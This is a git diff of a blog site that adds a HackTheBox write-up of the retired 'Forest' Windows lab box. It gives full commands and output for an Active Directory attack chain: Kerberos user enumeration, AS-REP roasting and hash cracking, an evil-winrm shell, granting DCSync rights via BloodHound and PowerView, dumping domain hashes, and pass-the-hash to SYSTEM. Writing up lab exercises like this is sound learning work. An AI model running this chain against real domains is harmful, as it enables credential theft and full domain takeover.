@@ -10,33 +10,29 @@
     <meta name="generator" content="After Dark Hugo">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tags | theyknow</title>
-    <meta name="description" content="">
-    <meta name="keywords" content="post, tools, ">
+    <title>HTB Write-up: Forest | theyknow</title>
+    <meta name="description" content="Forest was retired on HackTheBox.eu so let&#39;s sum up what I learned while solving this Windows box.">
+    <meta name="keywords" content="htb, ctf, windows, smb, bloodhound, john">
     
     
     
     
-      <meta name="robots" content="noindex">
-    
-    <meta property="og:title" content="Tags" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://domain.example/tags/" />
+    <meta property="og:title" content="HTB Write-up: Forest" />
+<meta property="og:description" content="Forest was retired on HackTheBox.eu so let&#39;s sum up what I learned while solving this Windows box." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://domain.example/post/forest/" />
 
-<meta property="og:image" content="https://images.alphacoders.com/712/thumb-1920-712781.jpg" />
-
-<meta property="og:updated_time" content="2020-03-25T12:40:00+02:00" />
+<meta property="og:image" content="https://0xrick.github.io/images/hackthebox/bastion/0.png" />
+<meta property="article:published_time" content="2020-03-25T12:40:00+02:00" />
+<meta property="article:modified_time" content="2020-03-25T12:40:00+02:00" />
 
     <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://images.alphacoders.com/712/thumb-1920-712781.jpg"/>
+<meta name="twitter:image" content="https://0xrick.github.io/images/hackthebox/bastion/0.png"/>
 
-<meta name="twitter:title" content="Tags"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:title" content="HTB Write-up: Forest"/>
+<meta name="twitter:description" content="Forest was retired on HackTheBox.eu so let&#39;s sum up what I learned while solving this Windows box."/>
 
     
-
-  <meta property="og:image" content="https://images.alphacoders.com/712/thumb-1920-712781.jpg">
 
 
 
@@ -93,9 +89,7 @@ fetchInject(["/js/lazysizes.min.js"]);
 
 
     
-      <link rel="alternate" type="application/rss+xml" href="https://domain.example/tags/index.xml" title="theyknow">
-    
-    <link rel="canonical" href="https://domain.example/tags/">
+    <link rel="canonical" href="https://domain.example/post/forest/">
     
     
     <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
@@ -202,7 +196,7 @@ a[itemprop="url"]:hover {
     
       
       
-        <a itemprop="url" href="/post">Posts</a>
+        <a itemprop="url" class="active" href="/post">Posts</a>
       
     
       
@@ -234,66 +228,392 @@ a[itemprop="url"]:hover {
 
 </header>
     <main>
-  <header>
-    <h1>Tags</h1>
-  </header>
-  <ul>
+  
     
-      <li><a href="bloodhound">bloodhound</a> (1)
+      <style>{{ -}}.hack header figure[itemtype*=ImageObject]{position:relative}.hack header figure[itemtype*=ImageObject] figcaption{position:absolute;bottom:0;right:0;text-align:right;padding:15px;font-style:oblique;font-size:smaller;mix-blend-mode:soft-light}.hack header figure[itemtype*=ImageObject] [itemprop=headline]{font-weight:700}</style>
     
-      <li><a href="bruteforce">bruteforce</a> (1)
+  
+  <article itemscope itemtype="https://schema.org/BlogPosting">
+    <meta itemprop="name" content="HTB Write-up: Forest">
+<meta itemprop="description" content="Forest was retired on HackTheBox.eu so let&#39;s sum up what I learned while solving this Windows box.">
+
+
+<meta itemprop="datePublished" content="2020-03-25T12:40:00&#43;02:00" />
+<meta itemprop="dateModified" content="2020-03-25T12:40:00&#43;02:00" />
+<meta itemprop="wordCount" content="1296">
+
+  <meta itemprop="image" content="https://0xrick.github.io/images/hackthebox/bastion/0.png">
+
+
+
+<meta itemprop="keywords" content="htb,ctf,windows,smb,bloodhound,john," />
+
+    <header>
+      <h1 itemprop="headline name">HTB Write-up: Forest</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>7 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2020-03-25T12:40:00&#43;02:00">25 Mar, 2020</time>
+
+
+      </p>
+      
+        <blockquote itemprop="description">Forest was retired on HackTheBox.eu so let&#39;s sum up what I learned while solving this Windows box.</blockquote>
+      
+      
+
+
+
+    </header>
     
-      <li><a href="crypto">crypto</a> (2)
-    
-      <li><a href="ctf">ctf</a> (6)
-    
-      <li><a href="enumaration">enumaration</a> (1)
-    
-      <li><a href="enumeration">enumeration</a> (1)
-    
-      <li><a href="forensic">forensic</a> (5)
-    
-      <li><a href="htb">htb</a> (2)
-    
-      <li><a href="i18">i18</a> (2)
-    
-      <li><a href="john">john</a> (3)
-    
-      <li><a href="linenum">linenum</a> (1)
-    
-      <li><a href="linux">linux</a> (1)
-    
-      <li><a href="malware">malware</a> (2)
-    
-      <li><a href="nremoteng">nremoteng</a> (1)
-    
-      <li><a href="nslookup">nslookup</a> (1)
-    
-      <li><a href="pentest">pentest</a> (1)
-    
-      <li><a href="privesc">privesc</a> (2)
-    
-      <li><a href="pspy">pspy</a> (1)
-    
-      <li><a href="re">re</a> (1)
-    
-      <li><a href="reverse">reverse</a> (1)
-    
-      <li><a href="smb">smb</a> (2)
-    
-      <li><a href="traffic-analysis">traffic-analysis</a> (2)
-    
-      <li><a href="web">web</a> (3)
-    
-      <li><a href="windows">windows</a> (3)
-    
-      <li><a href="wireshark">wireshark</a> (3)
-    
-  </ul>
-</main>
+
+    <div itemprop="articleBody">
+      
+
+<p>The Forest Windows box retired this weekend on <a  target="_blank" rel="external noopener" href="https://www.hackthebox.eu/">HackTheBox</a>. Getting user was quite straight forward but escalating privileges was a little more compricated. We&rsquo;ll have a look at <a  target="_blank" rel="external noopener" href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> for that last step, it&rsquo;s an open source tool that I use a lot for work now and that I can&rsquo;t recommend enough.</p>
+
+<p><img src="/forest.png" alt="Forest badge" /></p>
+
+<h2 id="1-recon">1: Recon</h2>
+
+<p>First, I do the usual nmap scan I start with on all boxes:
+
+
+
+
+<div class="alert alert-info">
+  
+nmap -A -T5 10.10.10.161 -oN nmap.txt<br>
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 10:08 EDT<br>
+Nmap scan report for 10.10.10.161<br>
+Host is up (0.052s latency).<br>
+Not shown: 989 closed ports<br>
+PORT     STATE SERVICE      VERSION<br>
+53/tcp   open  domain?<br>
+| fingerprint-strings: <br>
+|   DNSVersionBindReqTCP: <br>
+|     version<br>
+|_    bind<br>
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-13 14:15:52Z)<br>
+135/tcp  open  msrpc        Microsoft Windows RPC<br>
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)<br>
+464/tcp  open  kpasswd5?<br>
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>
+636/tcp  open  tcpwrapped<br>
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>
+3269/tcp open  tcpwrapped<br>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>
+SF-Port53-TCP:V=7.80%I=7%D=10/13%Time=5DA33001%P=x86_64-pc-linux-gnu%r(DNS<br>
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version<br>
+SF:\x04bind\0\0\x10\0\x03");<br>
+Aggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2012 or Server 2012 R2 (91%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 (91%)<br>
+No exact OS matches for host (test conditions non-ideal).<br>
+Network Distance: 2 hops<br>
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+</div>
+
+</p>
+
+<p>Looking at the open ports, we have a very standard windows box using Active Directory and that the domain is called &ldquo;htb.local&rdquo;. If you&rsquo;re starting to learn about Active Directory pen-testing, I highly recommend googling these services such as LDAP, RPC, and Kerberos.</p>
+
+<p>By design, Active Directory can be asked for a lot of public information without being authenticated, so let&rsquo;s just do that with one of nmap scripts (also possible with Metasploit&rsquo;s smb_enum_users):
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/root/HTB_writeups/HackTheBox/Forest/users.txt 10.10.10.161<br>
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 11:24 EDT<br>
+Nmap scan report for 10.10.10.161<br>
+Host is up (0.043s latency).<br>
+<br>
+PORT   STATE SERVICE<br>
+88/tcp open  kerberos-sec<br>
+| krb5-enum-users: <br>
+| Discovered Kerberos principals<br>
+|     santi@htb.local<br>
+|     qwe@htb.local<br>
+|     sebastien@htb.local<br>
+|     svc-alfresco@htb.local<br>
+|     mark@htb.local<br>
+|     andy@htb.local<br>
+|_    lucinda@htb.local<br>
+<br>
+Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
+
+</div>
+
+</p>
+
+<p>Sweet! We got a list of users! One of them pops out from all the others: svc-alfresco. The name &ldquo;svc&rdquo; would mean that it&rsquo;s a service account so we can check if it was misconfigured. There is this cool <a  target="_blank" rel="external noopener" href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">cheatsheet</a> to learn how to use the widly recommended <a  target="_blank" rel="external noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>. Following the cheatsheet, we check if any of the users are vulnerable to <a  target="_blank" rel="external noopener" href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">ASREPRoast</a>:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Downloads/impacket-0.9.20/examples# GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile /root/HTB_writeups/HackTheBox/Forest/users.txt<br>
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation<br>
+<br>
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:8fc61bd2945c40654201cce35f6702c7$cc2d0b8f0d53a4dcbb1d491773ea7bddd7fc3f30886ce8f59a379c5d8cd012011f1962816d141baa2efe7c83ffbfe08a171fc383dd65228cd0630353acc007f696920879c1e69b1344ff301dc8449176bd87848a73e61298cd7c450f71db1f4da5d90458099482d295f80a81813fd64ac87b02c8441f422612a82c3325b61442aec5f004479c9a23359232ac4c4785282f0e0bdea5e5e22edabc5e90d551362c7704d962db0399a0aa555233a978a07947b0d5c6593dfbdf6a37ca50944e927626a2eaa8447df84033886e8ad2109f3e37104ffaaf39a98ce984cb0c102a870f33d6bb579a4f<br>
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[-] User qwe doesn't have UF_DONT_REQUIRE_PREAUTH set<br>
+[-] User forest doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+</div>
+
+</p>
+
+<p>As we expected, src-alfresco was misconfigured and did not require pre-authentication and we got the account&rsquo;s hash! Time to crack it!</p>
+
+<p><br></p>
+
+<h2 id="2-getting-a-shell">2: Getting a shell</h2>
+
+<p>Copy the hash to a text file called hash.txt, and run the following with john:
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/# john --wordlist=/root/rockyou.txt hash.txt<br>
+Using default input encoding: UTF-8<br>
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])<br>
+Will run 4 OpenMP threads<br>
+Press 'q' or Ctrl-C to abort, almost any other key for status<br>
+s3rvice          (?)<br>
+1g 0:00:00:03 DONE (2019-10-13 12:36) 0.2557g/s 1044Kp/s 1044Kc/s 1044KC/s s4553592..s3r2s1<br>
+Use the "--show" option to display all of the cracked passwords reliably<br>
+Session completed
+
+</div>
+
+</p>
+
+<p>Great! It took only 3 seconds, but not surprising with how bad the password was: s3rvice. Now we can get our shell with my favourite evil-winrm and get the user flag:</p>
+
+<p><img src="/user_owned.png" alt="evil-winrm shell" /></p>
+
+<p><br></p>
+
+<h2 id="3-priviledge-escalation">3: Priviledge Escalation</h2>
+
+<p>In Active Directory, you can use <a  target="_blank" rel="external noopener" href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> to find relationships (between users, groups and computers) which can be used to escalate your privileges. It is very useful for the red team but also for the blue team in order to identify and mitigate the vulnerabilities and limit the paths to high value targets within your AD architecture.</p>
+
+<p>After downloading the lastest release of BloodHound, we can use our evil-winrm shell to upload it to the serve, run it there, and download back the results which will be in a zip format.</p>
+
+
+
+
+
+<div class="alert alert-info">
+  
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload ~/Downloads/BloodHound/Ingestors/SharpHound.ps1 .\SharpHound.ps1<br>
+<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1<br>
+<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice<br>
+<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download .\20191031121111_BloodHound.zip /root/Downloads/BloodHound/Ingestors/report.zip<br>
+<br>
+Info: Downloading .\20191031121111_BloodHound.zip to /root/Downloads/BloodHound/Ingestors/report.zip<br>
+<br>
+Info: Download successful!
+
+</div>
+
+
+
+<p>If you&rsquo;ve done the BloodHound set up correctly following their GitHub guide, you should have neo4j (database) running and the bloodhound gui opened. Just dragged and dropped the zip file into the BloodHound gui and it will upload it to the database automatically. When it&rsquo;s finished, select the &ldquo;Shortest path to Domain Admin&rdquo; query and you&rsquo;ll see something like this:</p>
+
+<p><img src="/shortest_path.png" alt="Shortest path to DA" /></p>
+
+<p>We&rsquo;re interested in the svc-alresco path, and we see that we&rsquo;re member of a group called &ldquo;Exchange Windows Permission&rdquo; which has WriteDacl right on the entire domain. WriteDacl basically gives this group the ability to create any relationship they want. Bad news for the blue team, great team for us! Even better is that by clicking the WriteDacl relationship in BloodHound, it gives us a step-by-step guide on how to exploit it:</p>
+
+
+
+
+
+<div class="alert alert-info">
+  
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/Downloads/dev_PowerSploit/PowerSploit/Recon/PowerView.ps1 .\PowerView.ps1<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ADGroupMember -Identity "EXCHANGE WINDOWS PERMISSIONS" -Members 'svc-alfresco'<br>
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -Rights DCSync -Verbose -PrincipalIdentity 'htb\svc-alfresco' -credential $Cred
+
+</div>
+
+
+
+<p>Following BloodHound&rsquo;s instructions, we gave ourselves (svc-alfresco) the DCSync right. DCSync is &ldquo;a late-stage kill chain attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password data via domain replication&rdquo; (source: <a  target="_blank" rel="external noopener" href="https://blog.stealthbits.com/what-is-dcsync-an-introduction/">this blog</a>).</p>
+
+<p>Thanks to this new right we&rsquo;ll be able to imitate the Domain Controller and identify ourselves as anyone else as long as we have their password hash. We don&rsquo;t even need their password! And a Domain Controller, we can now dump all the password hashes, how convenient:</p>
+
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Downloads/impacket/examples# python3 secretsdump.py svc-alfresco@10.10.10.161 -dc-ip 10.10.10.161<br>
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation<br>
+<br>
+Password:<br>
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied <br>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>
+[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::<br>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::<br>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::<br>
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::<br>
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::<br>
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::<br>
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::<br>
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::<br>
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::<br>
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::<br>
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::<br>
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::<br>
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::<br>
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::<br>
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::<br>
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::<br>
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::<br>
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::<br>
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::<br>
+vtx:7601:aad3b435b51404eeaad3b435b51404ee:4fe81be97e299fe1b2d3798af44d5268:::<br>
+maverick:7602:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:cae144f9a15df3a4f011e5f30579b3bc:::<br>
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::<br>
+[*] Cleaning up...
+
+</div>
+
+
+
+<p>Here is the Administrator password hash. One last Impacket script and we have a shell as Administrator:</p>
+
+
+
+
+
+<div class="alert alert-info">
+  
+root@kali:~/Downloads/impacket/examples# python3 psexec.py Administrator@10.10.10.161 -target-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6<br>
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation<br>
+<br>
+[*] Requesting shares on 10.10.10.161.....<br>
+[*] Found writable share ADMIN$<br>
+[*] Uploading file hKQHLske.exe<br>
+[*] Opening SVCManager on 10.10.10.161.....<br>
+[*] Creating service lepp on 10.10.10.161.....<br>
+[*] Starting service lepp.....<br>
+[!] Press help for extra shell commands<br>
+Microsoft Windows [Version 10.0.14393]<br>
+(c) 2016 Microsoft Corporation. All rights reserved.<br>
+<br>
+C:\Windows\system32>whoami<br>
+nt authority\system
+
+</div>
+
+
+
+<p>That was probably my favourite Windows box, and it&rsquo;s definitely not an easy one! I recommend it to anyone interested in Windows pen-testing.</p>
+
+<p><img src="/why.gif" alt="Why gif" /></p>
+
+    </div>
     <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">theyknow</span>
+    
+  
+  <time itemprop="datePublished" datetime="2020-03-25T12:40:00&#43;02:00">
+    25 Mar, 2020
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/post/">post</a></span>
+  
+  
+    and tagged <a rel="tag" href="/tags/bloodhound/">bloodhound</a>, <a rel="tag" href="/tags/ctf/">ctf</a>, <a rel="tag" href="/tags/htb/">htb</a>, <a rel="tag" href="/tags/john/">john</a>, <a rel="tag" href="/tags/smb/">smb</a> and <a rel="tag" href="/tags/windows/">windows</a>
+  
+  using <span itemprop="wordCount">1296</span> words.
+</p>
+
+      
+
+
+
+  
+    <aside>
+      <header>Related Content</header>
+      
+        <ul>
+          
+            <li><a href="/post/bastion/">HTB Write-up: Bastion</a>
+            <time class="muted" datetime="4M">4 minutes</time>
+          
+            <li><a href="/post/i18-1/">i18 Challenge - Part 1</a>
+            <time class="muted" datetime="5M">5 minutes</time>
+          
+            <li><a href="/tools/pentest/">Pentesting tools</a>
+            <time class="muted" datetime="10M">10 minutes</time>
+          
+            <li><a href="/post/upload-tools/">Upload enumeration tools to a linux server</a>
+            <time class="muted" datetime="3M">3 minutes</time>
+          
+            <li><a href="/post/i18-2/">i18 Challenge - Part 2</a>
+            <time class="muted" datetime="4M">4 minutes</time>
+          
+        </ul>
+      
+    </aside>
   
 
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  <small class="muted">
+    
+
+  </small>
 </footer>
     
     
